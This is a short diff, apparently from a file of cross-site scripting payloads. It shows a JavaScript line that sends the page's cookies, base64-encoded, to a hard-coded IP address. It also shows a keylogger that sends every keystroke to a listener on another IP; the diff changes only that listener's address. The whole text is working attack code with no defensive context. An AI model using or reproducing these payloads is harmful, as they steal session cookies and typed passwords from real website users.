@@ -7,4 +7,4 @@ var i = new Image(0, 0); i.src=`http://141.87.56.178:5000/?cookie=${btoa(documen
 
 
 
-var i = new Image(0, 0); document.body.appendChild(i); addEventListener("keypress", (event) => {i.src=`http://141.87.56.178:5002/logger?stroke=${event.key}`});
+var i = new Image(0, 0); document.body.appendChild(i); addEventListener("keypress", (event) => {i.src=`http://141.87.56.248:5002/logger?stroke=${event.key}`});
